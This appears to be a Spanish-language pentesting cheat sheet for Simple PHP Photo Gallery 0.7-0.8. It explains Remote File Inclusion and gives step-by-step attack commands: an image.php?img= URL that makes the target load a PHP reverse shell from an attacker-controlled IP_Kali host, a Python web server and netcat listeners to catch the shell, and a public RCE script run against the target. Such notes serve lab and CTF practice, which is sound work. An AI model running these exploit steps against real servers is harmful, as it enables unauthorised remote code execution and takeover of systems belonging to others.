# Simple PHP Photo Gallery versión 0.7 -0.8

Tags: #Linux #SimplePHPGallery #PHP 


## RFI

RFI significa Remote File Inclusion, o inclusión remota de archivos. Es una vulnerabilidad típica de aplicaciones web, especialmente históricamente en PHP.

La idea básica es que la aplicación recibe una ruta o recurso controlado por el usuario y, en lugar de tratarlo simplemente como texto, intenta incluirlo/cargarlo como código o archivo.

* [RFI](https://www.exploit-db.com/exploits/48424)
* [reverse.php](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)

```bash 
# Utilizar el PoC en la web para verificar si existe el RFI
http://IP/image.php?img=http://IP_Kali/

❯ nc -nlvp 80    # Recibir la petición y verificar la vulnerabilidad 
```

```bash 
# Explotar la vulnerabilidad

Paso 1:
# Crear el archivo con la revershell del enlace anterior
❯ nvim reverse.php   # Crear el archivo 
	# Colocar el puerto 33060 para hacer una buena conexión 

Paso 2:
❯ python3 -m http.server 80   # Compartir el archivo con la revershell 
❯ rlwrap nc -nlvp 33060       # Recibir la revershell 
```

```bash 
Paso 3:
# En la web ejecutar el RFI
http://IP/image.php?img=http://IP_Kali/reverse.php
```

## RCE 

* [RCE](https://github.com/beauknowstech/SimplePHPGal-RCE.py)

```bash 
❯ python3 SimplePHPGal-RCE.py -h      # Panel de ayuda 

❯ python3 SimplePHPGal-RCE.py http://IP/ IP_Kali 4444
	# IP = Dirección IP de la aplicación 
```

```bash 
❯ rlwrap nc -nlvp 4444
```